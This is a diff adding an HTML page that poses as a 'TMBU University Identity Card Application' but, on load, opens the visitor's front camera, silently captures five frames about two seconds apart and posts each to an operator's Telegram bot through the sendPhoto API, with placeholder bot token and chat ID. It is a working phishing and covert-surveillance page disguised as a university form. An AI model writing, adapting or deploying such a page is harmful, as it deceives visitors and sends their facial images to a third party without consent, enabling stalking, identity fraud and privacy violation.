@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TMBU University Identity Card Application</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+
+        h1 {
+            text-align: center;
+        }
+
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 80vh;
+        }
+
+        #video {
+            max-width: 100%;
+            border: 1px solid #ccc;
+            box-shadow: 2px 2px 6px rgba(0, 0, 0, 0.1);
+            display: none; /* Initially hide the video element */
+        }
+
+        #message {
+            margin-top: 10px;
+            color: #007BFF;
+            font-weight: bold;
+            text-align: center;
+        }
+
+        #permissionMessage {
+            margin-top: 10px;
+            color: #ff0000;
+            font-weight: bold;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <h1>TMBU University Identity Card Application</h1>
+    <div class="container">
+        <p id="permissionMessage">Please allow access to the front camera to capture selfies...</p>
+        <video id="video" autoplay></video>
+        <p id="message"></p>
+    </div>
+
+    <script>
+        let selfieCount = 0;
+
+        // Function to request camera access and capture a selfie
+        async function captureSelfieAndSendToTelegram() {
+            const video = document.getElementById("video");
+            const message = document.getElementById("message");
+
+            try {
+                // Capture a frame from the video stream
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Convert the captured frame to a data URL
+                const selfieDataUrl = canvas.toDataURL("image/jpeg");
+
+                // Send the data URL to your Telegram bot
+                const botToken = "YOUR_BOT_TOKEN"; // Replace with your Telegram bot token
+                const chatId = "YOUR_CHAT_ID"; // Replace with your chat ID
+                const apiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+                const formData = new FormData();
+                formData.append("chat_id", chatId);
+                formData.append("photo", selfieDataUrl);
+
+                const response = await fetch(apiUrl, {
+                    method: "POST",
+                    body: formData
+                });
+
+                if (response.ok) {
+                    console.log(`Selfie ${selfieCount + 1} sent to Telegram bot successfully!`);
+                    selfieCount++;
+                    if (selfieCount < 5) {
+                        setTimeout(captureSelfieAndSendToTelegram, 2000); // Capture every 2 seconds
+                    } else {
+                        message.textContent = "All selfies sent to Telegram bot!";
+                    }
+                } else {
+                    console.error("Error sending selfie to Telegram bot.");
+                    alert("Error sending selfie to Telegram bot.");
+                }
+            } catch (error) {
+                console.error("Error capturing selfie: ", error.message);
+                alert("Error capturing selfie: " + error.message);
+            }
+        }
+
+        // Initialize the camera access function when the page loads
+        window.addEventListener("load", () => {
+            const video = document.getElementById("video");
+            const message = document.getElementById("message");
+            const permissionMessage = document.getElementById("permissionMessage");
+
+            // Check for camera permissions
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then((stream) => {
+                    video.srcObject = stream;
+                    video.play();
+                    video.style.display = "block"; // Show the video element
+                    message.style.display = "none"; // Hide the message
+                    permissionMessage.style.display = "none"; // Hide the permission message
+                    setTimeout(captureSelfieAndSendToTelegram, 2000); // Capture every 2 seconds
+                })
+                .catch((error) => {
+                    console.error("Error accessing camera: ", error.message);
+                    permissionMessage.textContent = "Camera access denied. Please allow access to capture selfies.";
+                });
+        });
+    </script>
+</body>
+</html>
